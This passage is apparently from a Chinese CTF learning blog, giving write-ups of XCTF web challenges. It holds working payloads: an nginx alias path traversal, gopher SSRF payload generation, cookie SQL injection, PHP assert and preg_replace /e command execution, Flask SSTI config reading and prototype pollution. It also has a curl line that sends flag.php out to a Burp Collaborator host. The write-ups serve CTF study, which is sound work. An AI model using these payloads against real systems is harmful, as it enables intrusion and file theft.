variable\">$uri</span>/ /index.php?q=<span class=\"token variable\">$uri</span>&amp;<span class=\"token variable\">$args</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">server_tokens</span> <span class=\"token boolean\">off</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">#error_page 404 /404.html;</span>\n\n    <span class=\"token comment\"># redirect server error pages to the static page /50x.html</span>\n    <span class=\"token comment\">#</span>\n    <span class=\"token directive\"><span class=\"token keyword\">error_page</span> <span class=\"token number\">500</span> <span class=\"token number\">502</span> <span class=\"token number\">503</span> <span class=\"token number\">504</span> /50x.html</span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> = /50x.html</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">root</span> /usr/share/nginx/html</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> ~ \\.php$</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">try_files</span> <span class=\"token variable\">$uri</span> <span class=\"token variable\">$uri</span>/ /index.php?q=<span class=\"token variable\">$uri</span>&amp;<span class=\"token variable\">$args</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_split_path_info</span> ^(.+\\.php)(/.+)$</span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_pass</span> unix:/var/run/php/php5.6-fpm.sock</span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_param</span> SCRIPT_FILENAME <span class=\"token variable\">$document_root</span><span class=\"token variable\">$fastcgi_script_name</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_param</span> SCRIPT_NAME <span class=\"token variable\">$fastcgi_script_name</span></span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_index</span> index.php</span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">include</span> fastcgi_params</span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">fastcgi_param</span> REMOTE_ADDR <span class=\"token variable\">$http_x_forwarded_for</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> ~ /\\.</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token directive\"><span class=\"token keyword\">log_not_found</span> <span class=\"token boolean\">off</span></span><span class=\"token punctuation\">;</span>\n            <span class=\"token directive\"><span class=\"token keyword\">deny</span> all</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> /web-img</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">alias</span> /images/</span><span class=\"token punctuation\">;</span>\n        <span class=\"token directive\"><span class=\"token keyword\">autoindex</span> <span class=\"token boolean\">on</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">location</span> ~* \\.(ini|docx|pcapng|doc)$</span> <span class=\"token punctuation\">&#123;</span>  \n         <span class=\"token directive\"><span class=\"token keyword\">deny</span> all</span><span class=\"token punctuation\">;</span>  \n    <span class=\"token punctuation\">&#125;</span>  \n\n    <span class=\"token directive\"><span class=\"token keyword\">include</span> /var/www/nginx[.]conf</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>对于这个配置文件，可以看到，也就是当访问&#x2F;web-img时，当用户访问<a href=\"https://www.wljslmz.cn/web-img/wljslmz.png%E6%97%B6%EF%BC%8C%E4%BC%9A%E6%89%BE%E5%88%B0/images/wljslmz.png%EF%BC%8C%E5%9B%BE%E7%89%87%E4%BC%9A%E8%A2%AB%E6%98%A0%E5%B0%84%E5%88%B0%60/images%60%EF%BC%8C%E4%B8%94%E6%AD%A4%E6%97%B6%E6%98%AF%E6%A0%B9%E7%9B%AE%E5%BD%95%E3%80%82\">https://www.wljslmz.cn/web-img/wljslmz.png时，会找到/images/wljslmz.png，图片会被映射到`/images`，且此时是根目录。</a></p>\n<pre class=\"line-numbers language-nginx\" data-language=\"nginx\"><code class=\"language-nginx\"><span class=\"token directive\"><span class=\"token keyword\">location</span> /web-img</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">alias</span> /images/</span><span class=\"token punctuation\">;</span>\n    <span class=\"token directive\"><span class=\"token keyword\">autoindex</span> <span class=\"token boolean\">on</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>那么也就可以访问<code>/web-img../</code>进行目录穿越</p>\n</li>\n</ul>\n<h2 id=\"一直提示需要登陆\"><a href=\"#一直提示需要登陆\" class=\"headerlink\" title=\"一直提示需要登陆\"></a>一直提示需要登陆</h2><p><img src=\"/../CTF-web-wp/14.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>这种用burp抓包，看cookie</p>\n</li>\n<li><p>把这里改成<code>1</code>就好了</p>\n</li>\n</ul>\n<h2 id=\"有源码的\"><a href=\"#有源码的\" class=\"headerlink\" title=\"有源码的\"></a>有源码的</h2><ul>\n<li>这种就需要很耐心，逐个搜一下每个函数</li>\n<li>逐段看每一个源码</li>\n</ul>\n<h1 id=\"攻防世界-very-easy-sql-难度3-ssrf\"><a href=\"#攻防世界-very-easy-sql-难度3-ssrf\" class=\"headerlink\" title=\"攻防世界 very_easy_sql(难度3) ssrf\"></a>攻防世界 very_easy_sql(难度3) ssrf</h1><h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p><img src=\"/../CTF-web-wp/15.png\" alt=\"image.png\"></p>\n<ul>\n<li>点进去之后，发现这显然是ssrf，之前学的ssrf都是直接ssrf+mysql或者ssrf+redis，这里有ssrf+mysql会显示no,no,no，显然不行</li>\n</ul>\n<p>放弃，看wp</p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><h3 id=\"查看源码发现curl\"><a href=\"#查看源码发现curl\" class=\"headerlink\" title=\"查看源码发现curl\"></a>查看源码发现curl</h3><ul>\n<li>由于最开始的index.php界面需要是内网用户，且需要输入密码，因此找到可以curl的地方。</li>\n<li>查看源码，发现&#x2F;use.php(草，太久没做，查看源码都忘了)</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/16.png\" alt=\"image.png\"></p>\n<h3 id=\"gopher-弱密码登录\"><a href=\"#gopher-弱密码登录\" class=\"headerlink\" title=\"gopher+弱密码登录\"></a>gopher+弱密码登录</h3><ul>\n<li><p>可以用gopher访问127.0.0.1:80的index.php界面，上脚本，尝试用gopher+弱密码登录。burp抓包，访问&#x2F;use.php。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse\n<span class=\"token keyword\">import</span> base64\n\n\nhost <span class=\"token operator\">=</span> <span class=\"token string\">\"127.0.0.1:80\"</span>\ncontent <span class=\"token operator\">=</span> <span class=\"token string\">\"uname=admin&amp;passwd=admin\"</span>\n\n<span class=\"token comment\"># str = \"admin') and extractvalue(1, concat(0x7e, (substr((select group_concat(flag) from flag), 20,50)),0x7e)) #\"</span>\n<span class=\"token comment\"># # 将字符串编码为bytes类型，然后使用base64.b64encode()函数进行Base64编码</span>\n<span class=\"token comment\"># encoded_bytes = base64.b64encode(str.encode('utf-8'))</span>\n\n<span class=\"token comment\"># # 将bytes类型的编码结果转换为字符串类型</span>\n<span class=\"token comment\"># encoded_str = encoded_bytes.decode('utf-8')</span>\n\ncontent_length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># cookie = f'this_is_your_cookie=&#123;encoded_str&#125;'</span>\ntest <span class=\"token operator\">=</span>\\\n<span class=\"token triple-quoted-string string\">\"\"\"POST /index.php HTTP/1.1\nHost: &#123;&#125;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: &#123;&#125;\n\n&#123;&#125;\n\"\"\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>content_length<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token comment\">#\\用于将字符串延续到下一行</span>\n\ntmp <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>test<span class=\"token punctuation\">)</span> \nnew <span class=\"token operator\">=</span> tmp<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"%0A\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"%0D%0A\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#需要用%0d%0a换行</span>\nresult <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">)</span> <span class=\"token comment\">#二次url编码，因为php在收到后就进行了一次解码</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gopher://\"</span><span class=\"token operator\">+</span>host<span class=\"token operator\">+</span><span class=\"token string\">\"/_\"</span><span class=\"token operator\">+</span>result<span class=\"token punctuation\">)</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>此时有回显，发现cookie处是admin经过base64加密的结果</p>\n</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/17.png\" alt=\"image.png\"></p>\n<h3 id=\"cookie注入\"><a href=\"#cookie注入\" class=\"headerlink\" title=\"cookie注入\"></a>cookie注入</h3><ul>\n<li>在发的包里加一个<code>Cookie=this_is_your_cookie=此处填写base64_encode(注入的payload)</code></li>\n<li>这里用<code>admin&#39;)#</code>测试成功，很奇怪</li>\n<li>发现可以报错注入，用extractvalue + 爆破信息的语句即可获得flag</li>\n</ul>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>记得查看源代码</li>\n<li>ssrf主要用gopher，除了gopher + mysql，还可以<code>gopher://127.0.0.1:80/index.php</code></li>\n<li>要对构造gopher payload的脚本很熟悉</li>\n<li>Cookie注入之前没注意过，要多看包的信息。</li>\n<li>Cookie注入有<code>admin&#39;)#</code>这种闭合方式，多注意<code>)</code>。</li>\n</ul>\n<h1 id=\"攻防世界-mfw-难度3-代码审计\"><a href=\"#攻防世界-mfw-难度3-代码审计\" class=\"headerlink\" title=\"攻防世界 mfw(难度3)代码审计\"></a>攻防世界 mfw(难度3)代码审计</h1><h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>首先<code>.git</code>可以下载源码</li>\n<li>但是我忘记了<code>GitHack</code>可以查看源码</li>\n</ul>\n<h2 id=\"wp-1\"><a href=\"#wp-1\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>下载源码后，有<code>assert</code>函数，这个东西当成eval处理</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/18.png\" alt=\"image.png\"></p>\n<ul>\n<li>所以这里可以通过闭合的方式注入<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">page<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">') or system('</span><span class=\"token operator\">/</span>templates<span class=\"token operator\">/</span>flag<span class=\"token operator\">.</span>php<span class=\"token string single-quoted-string\">')\npage='</span><span class=\"token operator\">.</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cat ./templates/flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li><code>or</code>可以用在字符串中，作用相当于<code>;</code></li>\n<li>可以用单行注释<code># 或 //</code>,多行注释<code>/*</code>注释后面的内容</li>\n</ul>\n<h1 id=\"攻防世界-fakebook-难度3-sql注入-ssrf\"><a href=\"#攻防世界-fakebook-难度3-sql注入-ssrf\" class=\"headerlink\" title=\"攻防世界 fakebook(难度3)sql注入+ssrf\"></a>攻防世界 fakebook(难度3)sql注入+ssrf</h1><h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题我之前做过，现在做还是不会，感觉现在明白点了</li>\n</ul>\n<h2 id=\"wp-2\"><a href=\"#wp-2\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><img src=\"/../CTF-web-wp/19.png\" alt=\"image.png\"></p>\n<ul>\n<li>注册之后，点击注册的用户，发现可能存在sql注入</li>\n<li>用sqlmap扫，没扫出来，于是手动注册</li>\n<li>内联注释绕过，发现是把数据序列化存入了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/20.png\" alt=\"image.png\"></p>\n<ul>\n<li>扫描后台，发现源码，这里有curl_exec，如果我把data的内容换了，是不是就可以读取flag.php了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/21.png\" alt=\"image.png\"></p>\n<ul>\n<li>通过union select 1,2,3,’序列化数据’，查看源码获得flag</li>\n</ul>\n<h2 id=\"总结-2\"><a href=\"#总结-2\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>看到<code>curl_exec</code>想到file协议</li>\n<li>sql手动注入</li>\n<li>union select改数据</li>\n</ul>\n<h1 id=\"攻防世界-ics-05-难度3-php伪协议查看源码\"><a href=\"#攻防世界-ics-05-难度3-php伪协议查看源码\" class=\"headerlink\" title=\"攻防世界 ics-05(难度3)php伪协议查看源码\"></a>攻防世界 ics-05(难度3)php伪协议查看源码</h1><h2 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>上来发现下面的页面，然后就不知道咋整了，尝试了很多种方法，这里其实应该想到，page&#x3D;index，可能存在文件包含，用伪协议读取源码</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/22.png\" alt=\"image.png\"></p>\n<h2 id=\"wp-3\"><a href=\"#wp-3\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li><p>伪协议读源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br >Welcome My Admin ! &lt;br >\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>pat<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$replacement</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>rep<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$subject</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>sub<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$replacement</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$subject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$replacement</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$subject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>发现危险函数preg_replace，当<code>$pattern</code>指定模式为<code>/e</code>时，<code>$replacement</code>会被当做php代码执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$pattern</span><span class=\"token operator\">=</span><span class=\"token operator\">/</span>test<span class=\"token operator\">/</span>e<span class=\"token operator\">&amp;</span><span class=\"token variable\">$replacement</span><span class=\"token operator\">=</span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ls'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>subject<span class=\"token operator\">=</span>test<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h1 id=\"攻防世界-simple-js-难度3-js代码审计\"><a href=\"#攻防世界-simple-js-难度3-js代码审计\" class=\"headerlink\" title=\"攻防世界 simple-js(难度3)js代码审计\"></a>攻防世界 simple-js(难度3)js代码审计</h1><h2 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>知道是看代码，但是我看不下去，所以没做出来</li>\n<li>其实认真看，这个题挺简单的</li>\n</ul>\n<h2 id=\"wp-4\"><a href=\"#wp-4\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><img src=\"/../CTF-web-wp/23.png\" alt=\"image.png\"></p>\n<ul>\n<li>审计代码，发现这个输出和输入没什么关系</li>\n<li>有一个可疑的字符串，把它用python输出一下,得到一串数据</li>\n</ul>\n<p>55,56,54,79,115,69,114,116,107,49,50</p>\n<ul>\n<li>猜测可能是ASCII码值，再用chr函数转换一下，就行了</li>\n<li>只审计代码，也可以，把tab2改成tab，也行。</li>\n</ul>\n<h1 id=\"攻防世界-easytornado-难度3-SSTI\"><a href=\"#攻防世界-easytornado-难度3-SSTI\" class=\"headerlink\" title=\"攻防世界 easytornado(难度3) SSTI\"></a>攻防世界 easytornado(难度3) SSTI</h1><h2 id=\"wp-5\"><a href=\"#wp-5\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><img src=\"/../CTF-web-wp/24.png\" alt=\"image.png\"></p>\n<ul>\n<li>测试后，发现这个界面，可能存在SSTI</li>\n</ul>\n<h1 id=\"攻防世界-shrine-难度3-SSTI\"><a href=\"#攻防世界-shrine-难度3-SSTI\" class=\"headerlink\" title=\"攻防世界 shrine(难度3) SSTI\"></a>攻防世界 shrine(难度3) SSTI</h1><h2 id=\"思路-5\"><a href=\"#思路-5\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>这个题，我看出来是SSTI，但是试了半天，不知道如何获取配置文件</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/25.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里是把<strong>变量名</strong>为config的置为None</li>\n</ul>\n<h2 id=\"wp-6\"><a href=\"#wp-6\" class=\"headerlink\" title=\"wp\"></a>wp</h2><ul>\n<li>通过<code>__globals__</code>获取<code>app</code>，再获取配置文件<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#123;</span>url_for<span class=\"token punctuation\">.</span>__globals__<span class=\"token punctuation\">[</span><span class=\"token string\">'current_app'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">[</span><span class=\"token string\">'FLAG'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h2 id=\"总结-3\"><a href=\"#总结-3\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>模板获取配置文件有3种方式</p>\n<ol>\n<li><code>&#123;&#123;self.__dict__&#125;&#125;</code></li>\n<li><code>config</code></li>\n<li><code>&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></li>\n</ol>\n<h1 id=\"攻防世界-wife-wife-难度4-原型链污染\"><a href=\"#攻防世界-wife-wife-难度4-原型链污染\" class=\"headerlink\" title=\"攻防世界 wife_wife(难度4) 原型链污染\"></a>攻防世界 wife_wife(难度4) 原型链污染</h1><h2 id=\"思路-6\"><a href=\"#思路-6\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p><strong>思路1：</strong></p>\n<ul>\n<li>这个题只有登录，注册的界面</li>\n<li>发现注册的地方，有isAdmin，要填邀请码，还不需要爆破</li>\n<li>显然需要是isAdmin,才能获取flag</li>\n<li>所以思路就是得把isAdmin改成true</li>\n<li>那怎么改值，不会</li>\n</ul>\n<p><strong>思路2：</strong></p>\n<ul>\n<li>我以为下载的图片会有什么问题，但其实并没有</li>\n</ul>\n<h2 id=\"wp-7\"><a href=\"#wp-7\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p><img src=\"/../CTF-web-wp/26.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>Object.assign() 是一个 JavaScript 函数，用于将一个或多个源对象的属性复制到目标对象中。它的语法如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Object.assign(target, ...sources)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>其中，target 表示目标对象，sources 表示一个或多个源对象</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> target <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> source <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">c</span><span class=\"token operator\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\nObject<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> source<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &#123; a: 1, b: 4, c: 5 &#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>在上面的示例中，target 对象的属性 b 被源对象 source 的属性 b 覆盖了，属性 c 则被复制到了 target 对象中。</p>\n</li>\n<li><p>所以在注册的时候，添加一个<code>&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:&quot;true&quot;&#125;</code></p>\n</li>\n</ul>\n<h1 id=\"攻防世界-Cat-难度4-django\"><a href=\"#攻防世界-Cat-难度4-django\" class=\"headerlink\" title=\"攻防世界 Cat(难度4) django\"></a>攻防世界 Cat(难度4) django</h1><h2 id=\"思路-7\"><a href=\"#思路-7\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>我在测试的时候输入cat，显示了这个是ping的界面，用以前的；截断，那些管道符不行，我就没招了</li>\n</ul>\n<p><img src=\"/../CTF-web-wp/27.png\" alt=\"image.png\"></p>\n<h2 id=\"wp-8\"><a href=\"#wp-8\" class=\"headerlink\" title=\"wp\"></a>wp</h2><h3 id=\"fuzz测试-1\"><a href=\"#fuzz测试-1\" class=\"headerlink\" title=\"fuzz测试\"></a>fuzz测试</h3><ul>\n<li><p>测试一下有哪些可用的字符，上脚本,这里用了多线程，能快点</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> concurrent<span class=\"token punctuation\">.</span>futures\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://61.147.171.105:63663/index.php?url=\"</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">test_char</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid URL\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n        \n<span class=\"token keyword\">with</span> concurrent<span class=\"token punctuation\">.</span>futures<span class=\"token punctuation\">.</span>ThreadPoolExecutor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> executor<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        executor<span class=\"token punctuation\">.</span>submit<span class=\"token punctuation\">(</span>test_char<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>测试之后，发现‘@’字符可用。</p>\n</li>\n<li><p>之前在学<code>Burp Collaborator</code>时，用<code>@</code>可以读取文件信息。(md 实际上早都忘记了)</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-X</span> POST <span class=\"token parameter variable\">-F</span> <span class=\"token assign-left variable\">xx</span><span class=\"token operator\">=</span>@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></li>\n</ul>\n<h3 id=\"宽字节测试\"><a href=\"#宽字节测试\" class=\"headerlink\" 